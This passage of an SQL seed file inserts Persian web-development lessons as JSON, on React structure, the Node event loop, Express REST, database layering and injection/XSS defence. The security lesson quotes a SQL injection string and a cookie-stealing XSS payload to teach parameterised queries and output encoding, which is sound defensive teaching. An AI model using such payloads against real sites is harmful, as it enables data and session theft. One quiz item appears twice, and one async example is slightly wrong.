داری یک کامپوننت مشترک است یا فیچری، از فیچری شروع کن؛ جابه‌جا کردن آن به مشترک وقتی واقعاً مصرف‌کننده دوم پیدا شد، آسان است — ولی بیرون‌کشیدن یک کامپوننت از مشترک که به یک فیچر گره خورده، سخت."},{"k":"h","t":"آنچه باید بدانید"},{"k":"list","items":["کامپوننت نمایشی فقط props می‌گیرد و state ندارد","کانتینری داده را می‌گیرد و به نمایشی می‌دهد","پوشه‌بندی فیچرمحور: features/orders به‌جای components/"]},{"k":"h","t":"مثال عملی"},{"k":"code","lang":"txt","title":"ساختار پروژه","code":"src/\n  features/\n    orders/\n      OrdersPage.tsx\n      OrderList.tsx\n      useOrders.ts\n  components/      ← مشترک و نمایشی\n    Button.tsx\n  hooks/"},{"k":"tip","title":"نکته منتور","t":"قانون طلایی: اگر کامپوننتی را نمی‌توانی در جای دیگر اپ استفاده کنی، باید داخل پوشه فیچرش باشد نه components مشترک."},{"k":"h","t":"جمع‌بندی"},{"k":"p","t":"برداشت اصلی این درس: کامپوننت نمایشی فقط props می‌گیرد و state ندارد بقیه درس‌های دوره همین ایده را عمیق‌تر می‌کنند؛ قبل از ادامه، پرسش‌های زیر را پاسخ بده تا مطمئن شوی مفهوم نشسته است."}]'::jsonb, '[{"q":"تفاوت کامپوننت نمایشی و کانتینری چیست؟","opts":["اندازه‌شان","نمایشی فقط props می‌گیرد و ظاهر است؛ کانتینری منطق و داده را مدیریت می‌کند","سرعت‌شان","تعداد props"],"ans":1,"why":"این جداسازی باعث می‌شود UI قابل‌استفاده‌مجدد و منطق قابل‌تست باشد."},{"q":"تفاوت کامپوننت نمایشی و کانتینری چیست؟","opts":["اندازه‌شان","نمایشی فقط props می‌گیرد و ظاهر می‌سازد؛ کانتینری داده و منطق را مدیریت و به نمایشی می‌دهد","سرعت‌شان","تعداد props"],"ans":1,"why":"این جداسازی باعث می‌شود UI فقط به props وابسته باشد (پس قابل‌استفاده‌مجدد و ساده‌تست) و منطق هم جدا بماند؛ هر دو راحت‌تر تغییر و تست می‌شوند."},{"q":"چرا پوشه‌بندی بر اساس فیچر بهتر از بر اساس نوع فایل است؟","opts":["قشنگ‌تر است","چون همه فایل‌های یک فیچر کنار هم‌اند و برای کار رویش لازم نیست بین ده پوشه بگردی؛ فقط مشترک‌ها جدا می‌شوند","سریع‌تر build می‌شود","اجباری است"],"ans":1,"why":"در ساختار نوع‌محور، یک فیچر بین پوشه‌های components و hooks و pages پخش می‌شود؛ در ساختار فیچرمحور، همه‌چیزِ مربوط به یک قابلیت در یک پوشه است و تغییرش متمرکز می‌شود."}]'::jsonb),
('node-r1', 'node', 'Event Loop؛ قلب تپنده Node', 60, 1, '[{"k":"p","t":"چطور یک زبان تک‌رشته‌ای می‌تواند هزاران اتصال همزمان را مدیریت کند؟ این پارادوکس ظاهری، تمام فلسفه Node است. اگر Event Loop را بفهمی، Node برایت از «یه جاوااسکریپتِ سمت سرور» به یک مدل ذهنی قدرتمند تبدیل می‌شود — و اگر نفهمی، هر کد کندی را با «چند رشته‌ای کردن» اشتباه می‌گیری."},{"k":"h","t":"یک رشته، ولی هیچ‌وقت معطل نیست"},{"k":"p","t":"Node فقط یک رشته اصلی برای اجرای کد جاوااسکریپت دارد؛ یعنی در هر لحظه دقیقاً یک خط کد تو اجرا می‌شود. اما عملیات‌های سنگینِ ورودی/خروجی (خواندن فایل، درخواست شبکه، کوئری دیتابیس) را به سیستم‌عامل و libuv می‌سپارد و خود منتظر نمی‌ماند؛ به سراغ کار بعدی می‌رود. وقتی آن عملیات تمام شد، نتیجه‌اش به‌صورت یک callback در صف می‌نشیند و Event Loop در زمان مناسب آن را اجرا می‌کند."},{"k":"h","t":"چرخه: بگیر، اجرا کن، تکرار"},{"k":"p","t":"Event Loop در هر دور، یک کار را از صف برمی‌دارد و تا ته اجرا می‌کند؛ بعد دور بعد. کلید ماجرا این است که هر کار باید «زود تمام شود»؛ چون تا تمام نشده، هیچ کار دیگری اجرا نمی‌شود. اگر یک کار محاسباتی سنگین یا یک حلقه طولانی در این رشته بیفتد، کل سرور برای همه کاربران قفل می‌شود. به همین دلیل قانون طلایی Node این است: هرگز رشته اصلی را مسدود نکن."},{"k":"h","t":"Microtask در برابر Macrotask"},{"k":"p","t":"همه کارهای در صف یکسان نیستند. Promiseها (microtask) اولویت بالاتری دارند و بعد از هر کار، قبل از رفتن به کار بعدیِ صف اصلی (macrotask مثل setTimeout)، همه microtaskهای موجود تخلیه می‌شوند. این اولویت‌بندی توضیح می‌دهد چرا یک Promise.resolve همیشه قبل از setTimeoutِ صفر اجرا می‌شود؛ دانستن این ترتیب، خیلی از «چرا این بعد از آن چاپ شد»‌ها را حل می‌کند."},{"k":"h","t":"مثال حل‌شده"},{"k":"code","lang":"js","title":"loop.js","code":"console.log(''۱ — شروع (همگام)'');\n\nsetTimeout(() => console.log(''۴ — timeout''), 0);\n\nPromise.resolve()\n  .then(() => console.log(''۳ — promise''));\n\nconsole.log(''۲ — پایان همگام'');\n\n// ترتیب واقعی: ۱ ، ۲ ، ۳ ، ۴\n// چرا؟ همه کد همگام اول اجرا می‌شود (۱ و ۲)،\n// بعد microtaskها (۳) و در آخر macrotaskها (۴)."},{"k":"list","items":["کد همگام (console.logهای ۱ و ۲) بدون وقفه تا انتها اجرا می‌شود؛ Event Loop وسطش به کس دیگری نوبت نمی‌دهد.","Promise.resolve یک microtask می‌سازد؛ بعد از پایان کد همگام، همه microtaskها قبل از macrotaskها تخلیه می‌شوند، پس ۳ قبل از ۴ است.","setTimeout با صفر میلی‌ثانیه هم بلافاصله اجرا نمی‌شود؛ فقط می‌گوید «زودترین فرصتِ بعد از اتمام کار فعلی و microtaskها» — پس آخر می‌آید."]},{"k":"def","term":"غیرمسدود (Non-blocking)","t":"یعنی شروعِ یک عملیات طولانی، اجرای بقیه کد را متوقف نمی‌کند؛ نتیجه بعداً از طریق callback یا Promise برمی‌گردد. این با «موازی‌سازی» فرق دارد: کارها همزمان پیش می‌روند (در سیستم‌عامل) ولی کدِ تو روی یک رشته، نوبتی اجرا می‌شود."},{"k":"table","head":["نوع کار","کجا","مثال"],"rows":[["همگام","رشته اصلی، مسدودکننده","حلقه سنگین، JSON.parse بزرگ"],["I/O غیرمسدود","به libuv/سیستم‌عامل سپرده می‌شود","fs.readFile، درخواست HTTP"],["Microtask","اولویت بالا، بعد از هر کار","Promise.then"],["Macrotask","صف اصلی","setTimeout، I/O کامل‌شده"]]},{"k":"warn","title":"دام رایج","t":"انجام یک محاسبه سنگین (مثل پردازش تصویر یا رمزنگاری بزرگ) مستقیم در مسیر درخواست؛ این کار رشته اصلی را می‌گیرد و همه درخواست‌های دیگر — حتی صفحات ساده — معطل می‌شوند. راه‌حل: worker_threads برای CPU-bound یا شکستن کار به تکه‌های کوچک."},{"k":"tip","title":"نکته حرفه‌ای","t":"وقتی خروجی ترتیب console.logها را پیش‌بینی می‌کنی، اول همه کد همگام، بعد microtaskها (Promiseها) و آخر macrotaskها (setTimeout) را بنویس؛ این الگو تقریباً همه سوالات مصاحبه Event Loop را حل می‌کند."},{"k":"h","t":"جمع‌بندی درس"},{"k":"list","items":["Node تک‌رشته است ولی I/O را به سیستم‌عامل می‌سپارد","هر دور Event Loop یک کار را تا ته اجرا می‌کند؛ پس کارها باید کوتاه باشند","microtaskها (Promise) قبل از macrotaskها (setTimeout) اجرا می‌شوند","رشته اصلی را با محاسبات سنگین مسدود نکن"]}]'::jsonb, '[{"q":"چرا Node با یک رشته می‌تواند هزاران اتصال را مدیریت کند؟","opts":["چون سریع است","چون I/O را به سیستم‌عامل می‌سپارد و فقط کد را نوبتی اجرا می‌کند","چون چند CPU دارد","نمی‌تواند"],"ans":1,"why":"انتظار برای شبکه/دیسک خارج از رشته اصلی می‌گذرد؛ رشته فقط کد را اجرا می‌کند که معمولاً کوتاه است."},{"q":"چرا Promise قبل از setTimeout صفر اجرا می‌شود؟","opts":["تصادفی است","چون Promise یک microtask است و microtaskها قبل از macrotaskها تخلیه می‌شوند","چون سریع‌تر است","چون setTimeout کند است"],"ans":1,"why":"Event Loop بعد از هر کار، ابتدا همه microtaskها را خالی می‌کند و سپس سراغ صف macrotask می‌رود."},{"q":"اگر یک حلقه سنگین در مسیر درخواست بیفتد چه می‌شود؟","opts":["فقط همان درخواست کند می‌شود","کل سرور برای همه کاربران قفل می‌شود چون رشته اصلی مسدود شده","Node خودکار چندرشته می‌شود","خطا می‌دهد"],"ans":1,"why":"تا کار فعلی تمام نشود Event Loop نوبت بعدی نمی‌دهد؛ پس یک کار طولانی همه را معطل می‌کند."}]'::jsonb),
('c10-l1', 'node', 'Node و Event Loop', 50, 2, '[{"k":"p","t":"سرورهای سنتی به‌ازای هر درخواست یک Thread می‌سازند؛ با هزاران کاربر، هزاران Thread و حافظه سر به فلک. Node مسیر دیگری رفت: یک Thread اصلی با Event Loop. عملیات‌های I/O (دیسک، شبکه) به libuv سپرده می‌شوند و وقتی تمام شدند، callbackشان به صف برمی‌گردد."},{"k":"code","lang":"js","title":"server.js","code":"const http = require(\"http\");\n\nconst server = http.createServer((req, res) => {\n    if (req.url === \"/\") {\n        res.writeHead(200, { \"Content-Type\": \"text/plain\" });\n        res.end(\"Hello from Node!\");\n    } else {\n        res.writeHead(404);\n        res.end(\"Not Found\");\n    }\n});\n\nserver.listen(3000, () => {\n    console.log(\"Server running on http://localhost:3000\");\n});"},{"k":"def","term":"Non-blocking I/O","t":"Thread اصلی هرگز منتظر دیسک یا شبکه نمی‌ماند؛ درخواست I/O را می‌فرستد و به کار بعدی می‌رسد. نتیجه: یک Thread می‌تواند هزاران اتصال همزمان را مدیریت کند — مناسب I/O-bound، نه CPU-bound."},{"k":"warn","title":"جایی که Node می‌میرد","t":"پردازش CPU-bound سنگین (مثل فشرده‌سازی بزرگ یا پردازش تصویر همگام) کل Event Loop را می‌گیرد و همه درخواست‌ها معطل می‌شوند. برای این کارها از Worker Thread، صف جداگانه یا زبان مناسب‌تر استفاده کن."},{"k":"tip","title":"نکته منتور","t":"قاعده طلایی: «یا callback بده، یا Promise برگردان، یا خطا را پرتاب کن». هیچ‌وقت خطا را قورت نده؛ یک خطای بی‌صدا در سرور، باگی است که نیمه‌شب در Production پیدا می‌شود."},{"k":"h","t":"عمیق‌تر: داخل Event Loop — چرا Node با یک نخ، هزاران اتصال را می‌گیرد"},{"k":"p","t":"Node همان مدل جاوااسکریپت مرورگر را گرفت و به سرور برد: یک نخ اصلی که فقط کد JS اجرا می‌کند، و کتابخانه libuv که کارهای «بلوکه‌کننده» (خواندن فایل، DNS، شبکه) را به ThreadPool و سیستم‌عامل می‌سپارد. وقتی می‌نویسی fs.readFile، نخ اصلی معطل نمی‌شود — ادامه می‌دهد و وقتی فایل آماده شد، callback در صف می‌نشیند. نتیجه: یک فرایند Node می‌تواند ده‌هزار اتصال همزمان نگه دارد چون به‌ازای هر اتصال نخ ندارد؛ فقط چند کیلوبایت state دارد. این معماری برای I/O-bound عالی است — ولی همین یک نخ، نقطه‌ضعفش هم هست: یک حلقه CPU-bound، همه را گروگان می‌گیرد."},{"k":"p","t":"Event Loop خودش فاز دارد و دانستن‌شان دیباگ را ساده می‌کند: تایمرها → callbackهای I/O → عملیات‌های سیستمی → setImmediate → بستن‌ها؛ و بعد از هر فاز، کل صف میکروتسک‌ها خالی می‌شود. دو نتیجه عملی: ۱) setImmediate بعد از یک دور I/O اجرا می‌شود ولی process.nextTick قبل از هر فاز بعدی — پس nextTick زیاد یعنی قفل Event Loop؛ ۲) هر چیزی که بیشتر از حدود ۵ میلی‌ثانیه در نخ اصلی طول بکشد، تأخیرش در تمام اتصال‌های همزمان ضرب می‌شود. ابزار شناسایی؟ ماژول worker_threads برای CPU-bound، و Profiler داخلی Node برای پیدا کردن همان گلوگاه."},{"k":"code","lang":"js","title":"deepdive-blocking.js","code":"// فاجعه: یک حلقه سنگین، ۵۰۰۰ کاربر آنلاین را فریز می‌کند\napp.get(''/report'', (req, res) => {\n  const start = Date.now();\n  let sum = 0;\n  while (Date.now() - start < 2000) sum += Math.random();  // ❌\n  res.json({ sum });\n});\n// در این ۲ ثانیه: هیچ درخواست دیگری پاسخ نمی‌گیرد!\n\n// راه‌حل ۱: پردازش سنگین به Worker:\nconst { Worker } = require(''worker_threads'');\nnew Worker(''./heavy.js'', { workerData: input })\n  .on(''message'', (result) => res.json(result));\n\n// راه‌حل ۲: شکستن کار به تکه‌های async:\nasync function chunked(arr, fn, size = 1000) {\n  for (let i = 0; i < arr.length; i += size) {\n    fn(arr.slice(i, i + size));\n    await setImmediate(() => {});   // نفس‌کشیدن Event Loop!\n  }\n}\n\n// قاعده طلایی: هر عملیات I/O حتماً async\nawait fs.promises.readFile(path);   // ✓ نخ آزاد می‌ماند\n// fs.readFileSync(path);           ❌ جز در startup، هرگز"},{"k":"table","head":["نوع بار کاری","مناسب Node؟","راه‌حل"],"rows":[["API با I/O زیاد (DB، شبکه)","عالی","همان نخ اصلی"],["پردازش تصویر/ویدیو","بد","worker_threads یا صف جدا"],["محاسبات ریاضی سنگین","بد","Worker یا سرویس مجزا"],["رابط بلادرنگ (WebSocket)","عالی","اتصال‌های سبک و زیاد"],["SSR صفحات پربازدید","نسبتاً","کش + Streaming"]]},{"k":"tip","title":"نکته منتور","t":"برای دیدن Event Loop با چشم خودت، متغیر محیطی NODE_DEBUG=timers را بگذار یا در کد، ترکیب setTimeout/setImmediate/process.nextTick را با console.log چاپ کن و ترتیب را پیش‌بینی کن. ده دقیقه بازی با این ترتیب‌ها، درکی می‌سازد که سوال‌های مصاحبه بک‌اند Node را برایت آب می‌کند."}]'::jsonb, '[{"q":"چرا Node برای APIهای پرترافیکِ دیتابیس‌محور مناسب است؟","opts":["چون چندرشته‌ای است","چون I/O ناهمگام است و Thread اصلی بلاک نمی‌شود","چون سریع‌ترین زبان است","چون حافظه بیشتری دارد"],"ans":1,"why":"بیشتر زمان یک API صرف انتظار برای دیتابیس و شبکه است؛ Node در این انتظارها بیکار نمی‌ماند و به درخواست‌های دیگر سرویس می‌دهد."},{"q":"برای پردازش تصویر سنگین در Node چه باید کرد؟","opts":["همان Thread اصلی","Worker Thread یا سرویس جداگانه","setTimeout","افزایش RAM"],"ans":1,"why":"پردازش همگام CPU-bound کل Event Loop را فریز می‌کند؛ Worker Thread پردازش را به رشته موازی منتقل می‌کند."}]'::jsonb),
('c10-l2', 'node', 'REST API با Express', 65, 3, '[{"k":"p","t":"Express لایه نازکی روی http است که مسیریابی و Middleware را ساده می‌کند. REST یعنی منابع (اسم‌ها) با URL و عملیات (فعل‌ها) با HTTP Method: GET خواندن، POST ایجاد، PUT/PATCH به‌روزرسانی و DELETE حذف. پاسخ‌ها با کد وضعیت معنا پیدا می‌کنند: ۲۰۰ موفق، ۲۰۱ ایجاد شد، ۴۰۴ نیست، ۴۲۲ ورودی نامعتبر."},{"k":"code","lang":"js","title":"api.js","code":"const express = require(\"express\");\nconst app = express();\napp.use(express.json());\n\nlet books = [{ id: 1, title: \"Clean Code\", author: \"Martin\" }];\n\n// GET /books\napp.get(\"/books\", (req, res) => {\n    res.json(books);\n});\n\n// POST /books با اعتبارسنجی\napp.post(\"/books\", (req, res) => {\n    const { title, author } = req.body;\n    if (!title || !author) {\n        return res.status(422).json({ error: \"title and author required\" });\n    }\n    const book = { id: books.length + 1, title, author };\n    books.push(book);\n    res.status(201).json(book);\n});\n\n// Middleware مدیریت خطا — همیشه آخر\napp.use((err, req, res, next) => {\n    console.error(err);\n    res.status(500).json({ error: \"Internal Server Error\" });\n});\n\napp.listen(3000);"},{"k":"h","t":"Middleware؛ زنجیره پردازش"},{"k":"p","t":"هر درخواست از یک زنجیره Middleware عبور می‌کند؛ هر کدام یا پاسخ می‌دهد یا با next() به بعدی می‌سپارد. لاگ، احراز هویت، Rate Limit و CORS همه با همین الگو پیاده می‌شوند — قدرت اصلی Express."},{"k":"code","lang":"js","title":"middleware.js","code":"const logger = (req, res, next) => {\n    console.log(`${req.method} ${req.url}`);\n    next();   // بدون این، درخواست برای همیشه گیر می‌کند!\n};\n\napp.use(logger);"},{"k":"warn","title":"فراموشی next()","t":"Middleware‌ای که نه پاسخ بدهد و نه next() را صدا بزند، درخواست را تا ابد معلق می‌کند و کاربر فقط Timeout می‌بیند. این باگ در لاگ‌ها هم دیده نمی‌شود — همیشه یکی از این دو را انجام بده."},{"k":"h","t":"عمیق‌تر: REST یعنی قرارداد — کدهای وضعیت و طراحی منابع"},{"k":"p","t":"REST را نه به‌عنوان «JSON فرستادن»، که به‌عنوان طراحی «منابع و فعل‌های استاندارد» ببین: /orders یک منبع است؛ GET می‌خواندش، POST به آن می‌افزاید، PUT/PATCH تغییرش می‌دهد، DELETE حذفش می‌کند — و URL برای فعل ساختن نیست (/getOrders ضدالگوست). کدهای وضعیت هم زبان مشترک قراردادند: 201 یعنی «ساخته شد» و باید Location بدهد، 204 یعنی «موفق ولی بدنه‌ای نیست»، 400 یعنی «اشتباه از توست» با جزئیات اعتبارسنجی، 401 یعنی «کیستی‌ات معلوم نیست»، 403 یعنی «می‌شناسمت ولی اجازه نداری» — و 500 یعنی «اشتباه از من است». کلاینتی که این تفاوت‌ها را بداند، می‌تواند بدون خواندن مستندات تو، نیمی از API را حدس بزند."},{"k":"p","t":"سه تصمیم طراحی که کیفیت API را تعیین می‌کنند: اول، نسخه‌بندی — از روز اول /api/v1 بگذار تا فردا بتوانی تغییر شکست‌ساز بدهی بدون نابودکردن کلاینت‌های قدیمی. دوم، صفحه‌بندی برای هر لیست — پاسخ بدون limit می‌تواند فردا با رشد داده، سرور را بکشد؛ cursor-based برای داده زنده، offset برای گزارش‌ها. سوم، شکل خطای استاندارد و ماشین‌خوانا — یک ساختار واحد {error: {code, message, details}} برای همه خطاها، تا کلاینت بتواند برنامه‌نویسی‌اش کند، نه پارس‌کردن متن آزاد."},{"k":"code","lang":"js","title":"deepdive-rest.js","code":"// طراحی منابع — نه فعل‌ها:\napp.get(''/api/v1/orders'');            // لیست + صفحه‌بندی\napp.post(''/api/v1/orders'');           // 201 + Location header\napp.get(''/api/v1/orders/:id'');        // 200 یا 404\napp.patch(''/api/v1/orders/:id'');      // تغییر جزئی\napp.delete(''/api/v1/orders/:id'');     // 204\n\n// پاسخ لیست مهندسی‌شده:\napp.get(''/api/v1/orders'', async (req, res) => {\n  const { cursor, limit = 20 } = req.query;\n  const { rows, nextCursor } = await orders.list({\n    cursor,\n    limit: Math.min(limit, 100),       // سقف اجباری!\n  });\n  res.json({\n    data: rows,\n    paging: { next_cursor: nextCursor },\n  });\n});\n\n// خطای استاندارد و قابل‌برنامه‌نویسی:\nres.status(422).json({\n  error: {\n    code: ''VALIDATION_FAILED'',\n    message: ''ورودی نامعتبر است'',\n    details: [{ field: ''email'', issue: ''فرمت ایمیل اشتباه است'' }],\n  },\n});"},{"k":"table","head":["کد","معنی","کی برگردانیم"],"rows":[["200 / 201 / 204","موفق — خواندن / ساختن / بدون بدنه","مسیرهای شاد"],["400 / 422","ورودی بد / اعتبارسنجی شکست","همراه با جزئیات fieldها"],["401 در برابر 403","ناشناس / بی‌اجازه","ترتیب چک: اول authn بعد authz"],["404","منبع نیست (یا نباید وجودش لو برود)","برای منابع محرمانه گاهی 403"],["409","تعارض — مثل ثبت تکراری","با پیام قابل‌اقدام"],["429","نرخ درخواست رد شده","همراه با Retry-After"]]},{"k":"warn","title":"ضدالگوی ۲۰۰ِ دروغین","t":"برگرداندن 200 با {success: false} برای همه خطاها — رایج‌ترین اشتباه APIهای تازه‌ساز. این کار مانیتورینگ HTTP را کور می‌کند، کش و retry را بی‌معنی می‌کند و هر کلاینتی را مجبور به پارس بدنه می‌کند. کدهای وضعیت رایگان و استانداردند؛ استفاده‌نکردن‌شان یعنی اختراع دوباره چرخ — مربع."}]'::jsonb, '[{"q":"کدام ترکیب Method و کد وضعیت برای «ایجاد منبع جدید» درست است؟","opts":["GET + 200","POST + 201","PUT + 404","POST + 200"],"ans":1,"why":"POST برای ایجاد است و 201 Created دقیقاً می‌گوید «منبع ساخته شد»؛ معمولاً با آدرس منبع جدید در Location همراه است."},{"q":"اگر Middlewareای next() را صدا نزند چه می‌شود؟","opts":["به Middleware بعدی می‌رود","درخواست معلق می‌ماند تا Timeout","خطای 500 می‌دهد","Express خطا می‌دهد"],"ans":1,"why":"زنجیره قطع می‌شود؛ نه پاسخی فرستاده می‌شود و نه خطایی — درخواست تا Timeout کلاینت باز می‌ماند."}]'::jsonb)
INSERT INTO lessons (id, course_id, title, minutes, sort_order, blocks, quiz) VALUES
('c10-l3', 'node', 'دیتابیس و لایه‌بندی', 70, 4, '[{"k":"p","t":"API بدون دیتابیس یعنی داده‌ها با ری‌استارت سرور می‌پرند. اتصال به دیتابیس را با یک درایور انجام می‌دهیم و برای جلوگیری از تزریق SQL، همیشه از Query پارامتری‌شده استفاده می‌کنیم. و مهم‌تر از اتصال: ساختار کد — Handler نباید مستقیم SQL بنویسد."},{"k":"code","lang":"js","title":"pg.js","code":"const { Pool } = require(\"pg\");\nconst pool = new Pool({ connectionString: process.env.DATABASE_URL });\n\n// Repository: تنها جایی که SQL زندگی می‌کند\nasync function findUserByEmail(email) {\n    const { rows } = await pool.query(\n        \"SELECT id, name, email FROM users WHERE email = $1\",\n        [email]   // پارامتری — هرگز string concat نکن!\n    );\n    return rows[0];\n}\n\n// Handler: فقط HTTP\napp.get(\"/users/by-email\", async (req, res, next) => {\n    try {\n        const user = await findUserByEmail(req.query.email);\n        if (!user) return res.status(404).json({ error: \"Not found\" });\n        res.json(user);\n    } catch (err) {\n        next(err);   // به Middleware خطا بسپار\n    }\n});"},{"k":"def","term":"SQL Injection","t":"اگر ورودی کاربر مستقیم داخل رشته SQL الحاق شود، مهاجم می‌تواند ساختار query را عوض کند؛ مثلاً با '' OR ''1''=''1 همه رکوردها را بخواند. Query پارامتری‌شده ورودی را «داده» نگه می‌دارد نه «کد»."},{"k":"tip","title":"نکته منتور","t":"لایه‌ها را جدا کن: Route فقط مسیر، Handler فقط HTTP و اعتبارسنجی، Service منطق کسب‌وکار و Repository دسترسی به داده. وقتی هر لایه یک مسئولیت دارد، تست‌کردن هرکدام بدون بقیه ممکن می‌شود."},{"k":"h","t":"عمیق‌تر: لایه‌بندی — چرا کنترل‌کننده نباید SQL بداند"},{"k":"p","t":"سروری که همه‌چیزش در route handler است — اعتبارسنجی، SQL، منطق کسب‌وکار و فرمت پاسخ در یک تابع — شاید اول سریع ساخته شود، ولی به‌مرور تبدیل می‌شود به کدی که هیچ‌کس جرئت تغییرش را ندارد: تست هر endpoint نیاز به بالاآوردن دیتابیس دارد، عوض‌کردن ORM یعنی جست‌وجوی کل پروژه، و منطق کسب‌وکار بین ده route کپی شده. لایه‌بندی این گره را باز می‌کند: کنترل‌کننده فقط HTTP را می‌فهمد (پارس ورودی، کد وضعیت)، سرویس فقط قوانین کسب‌وکار را (بدون هیچ اشاره‌ای به Express)، و Repository فقط دیتابیس را. قانون جهت: وابستگی فقط به سمت داخل — سرویس نمی‌داند داده از Postgres می‌آید یا Mongo."},{"k":"p","t":"دو جز زیرساختی که جدی‌نگرفتن‌شان حادثه واقعی در تولید می‌سازد: Connection Pool و تراکنش. هر query نباید اتصال تازه بسازد (دست‌دادن TCP + auth حدود ۵۰ms است!) — Pool اتصال‌ها را نگه می‌دارد و امانت می‌دهد؛ اندازه‌اش را هم کوچک نگه دار (حدود دو برابر هسته‌ها) چون دیتابیس با هزار اتصالِ باز بیشتر کند می‌شود نه سریع‌تر. تراکنش هم مرز اتمیته است: کسر موجودی و ثبت سفارش یا هر دو انجام شوند یا هیچ‌کدام — BEGIN/COMMIT/ROLLBACK را یاد بگیر و هر جایی که چند نوشتنِ وابسته داری، تراکنش بگذار. باگ‌های «پول کم شد ولی سفارش ثبت نشد» دقیقاً از غیبت همین دو کلمه می‌آیند."},{"k":"code","lang":"js","title":"deepdive-layers.js","code":"// Repository — فقط دیتابیس می‌فهمد\nclass OrderRepository {\n  constructor(pool) { this.pool = pool; }   // Pool یک‌بار، همه‌جا\n\n  async findByCustomer(customerId, { cursor, limit }) {\n    const { rows } = await this.pool.query(\n      `SELECT * FROM orders\n       WHERE customer_id = $1 AND id < COALESCE($2, id)\n       ORDER BY id DESC LIMIT $3`,\n      [customerId, cursor, limit]);\n    return rows;\n  }\n}\n\n// Service — فقط قانون کسب‌وکار؛ Express و SQL نمی‌بیند\nclass OrderService {\n  constructor(repo) { this.repo = repo; }\n\n  async cancel(orderId, userId) {\n    const order = await this.repo.findById(orderId);\n    if (order.customerId !== userId) throw new Forbidden();\n    if (order.status !== ''pending'') throw new Conflict(''فقط سفارش در انتظار لغو می‌شود'');\n    return this.repo.updateStatus(orderId, ''cancelled'');\n  }\n}\n\n// Controller — فقط HTTP\nrouter.patch(''/:id/cancel'', wrap(async (req, res) => {\n  await service.cancel(req.params.id, req.user.id);\n  res.status(204).end();\n}));\n// تست service با یک repo ساختگی، بدون دیتابیس، در میلی‌ثانیه!"},{"k":"p","t":"یک معیار طلایی برای اینکه لایه‌بندی‌ات واقعی است یا نمایشی: آیا می‌توانی service را بدون Express تست کنی؟ آیا می‌توانی بدون تغییر service، دیتابیس را عوض کنی؟ اگر جواب هر دو بله است، معماری‌ات کار می‌کند. و اگر پروژه کوچک است و این لایه‌ها اغراق به‌نظر می‌رسند — حداقل مرز Repository را نگه دار؛ همان یک مرز، روزی که از SQLite به Postgres مهاجرت می‌کنی (و خواهی کرد)، تفاوت بین یک بعدازظهر و یک ماه است."},{"k":"tip","title":"نکته منتور","t":"برای شروع هر API جدید، اول سه فایل خالی بساز: orders.routes.js، orders.service.js، orders.repository.js — حتی اگر خط اولشان خالی باشد. ساختار قبل از کد، عادت قبل از فشار؛ وقتی deadline نزدیک می‌شود دیگر فرصت فکرکردن به معماری نیست، ساختار از قبل آماده باید باشد."}]'::jsonb, '[{"q":"چرا pool.query با $1 امن‌تر از ساخت رشته با + است؟","opts":["سریع‌تر است","ورودی به‌عنوان داده فرستاده می‌شود نه بخشی از SQL","کوتاه‌تر است","نیاز به await ندارد"],"ans":1,"why":"در query پارامتری‌شده، دیتابیس ساختار دستور را از قبل می‌شناسد؛ کاراکترهای خاص ورودی هرگز به‌عنوان SQL تفسیر نمی‌شوند."},{"q":"مسئولیت لایه Repository چیست؟","opts":["پاسخ HTTP","منطق کسب‌وکار","دسترسی به داده و SQL","مسیریابی"],"ans":2,"why":"SQL و جزئیات دیتابیس فقط در Repository؛ بقیه لایه‌ها با متد‌های معنادار مثل findUserByEmail کار می‌کنند و قابل‌تعویض‌اند."}]'::jsonb),
('c16-l1', 'node', 'تزریق و XSS؛ دو دشمن قدیمی', 55, 5, '[{"k":"p","t":"تزریق وقتی رخ می‌دهد که ورودی کاربر به‌جای «داده»، به‌عنوان «دستور» تفسیر شود — در SQL، سیستم‌عامل یا مرورگر. دفاع مشترک همه این‌ها یک اصل است: مرز سخت بین داده و کد."},{"k":"code","lang":"py","title":"sqli.py","code":"# آسیب‌پذیر: ورودی داخل رشته SQL\ncursor.execute(f\"SELECT * FROM users WHERE name = ''{name}''\")\n# name = \"'' OR ''1''=''1\"  => همه کاربران برمی‌گردند!\n\n# امن: query پارامتری‌شده\ncursor.execute(\"SELECT * FROM users WHERE name = %s\", (name,))\n# ورودی هر چه باشد، فقط یک مقدار متنی است"},{"k":"code","lang":"js","title":"xss.js","code":"// آسیب‌پذیر: HTML کاربر مستقیم به صفحه\nel.innerHTML = userComment;\n// comment = \"<img src=x onerror=steal(document.cookie)>\"\n\n// امن: متن به‌عنوان متن رندر می‌شود\nel.textContent = userComment;\n\n// در React هم همین اصل خودکار است:\n// {comment} — همیشه escape می‌شود\n// dangerouslySetInnerHTML — پرچم قرمز! فقط با ضدعفونی"},{"k":"table","head":["حمله","مسیر","دفاع اصلی"],"rows":[["SQL Injection","فرم ورود / پارامتر URL","Query پارامتری‌شده + ORM"],["XSS","کامنت / پروفایل کاربر","Output encoding + CSP"],["Command Injection","نام فایل آپلودی","اجتناب از shell + allow-list"]]},{"k":"def","term":"CSP","t":"هدر Content-Security-Policy به مرورگر می‌گوید اسکریپت فقط از چه منابعی مجاز است؛ حتی اگر XSS رخ بدهد، اجرای اسکریپت خارجی یا inline را خنثی می‌کند — لایه دفاع دوم."},{"k":"warn","title":"فیلتر سیاه‌لیستی ممنوع","t":"تلاش برای حذف کلمات کلیدی بد (مثل پاک‌کردن ''SELECT'') همیشه راه فرار دارد. همیشه از allow-list و ساختارهای امن (پارامتر، escape) استفاده کن — دفاع ساختاری نه متنی."},{"k":"h","t":"عمیق‌تر: چرا Parameterized Query و CSP آخرین سنگرند"},{"k":"p","t":"تزریق SQL در عمقش یک مشکل «مرز نداشتن» است: داده و فرمان در یک رشته قاطی می‌شوند و دیتابیس نمی‌تواند بفهمد کدام بخشش حرف کاربر است. Query پارامتری‌شده این مرز را در سطح پروتکل می‌سازد: متن فرمان یک‌بار برای همیشه به دیتابیس می‌رود و مقادیر جدا، به‌عنوان داده — پس حتی اگر مقدار '' OR 1=1 -- باشد، فقط یک «رشته عجیب» است که هیچ فرمانی اجرا نمی‌کند. ORMها به‌طور پیش‌فرض همین کار را می‌کنند؛ خطر زمانی است که از «درگاه فرار»شان (raw query) بدون پارامتر استفاده کنی. قانون: raw فقط با پارامتر، و فیلتر کردن/فرارکردن رشته‌ها راه‌حل نیست — ساختار را درست کن، نه متن را."},{"k":"p","t":"XSS هم همین بیماری در سمت مرورگر است: محتوای کاربر به‌جای نمایش‌داده‌شدن، «اجرا» می‌شود — یک <script> یا حتی یک onerror روی img می‌تواند Session کاربر را بدزدد یا به اسمش عمل انجام بدهد. فریم‌ورک‌های مدرن (React، Vue) 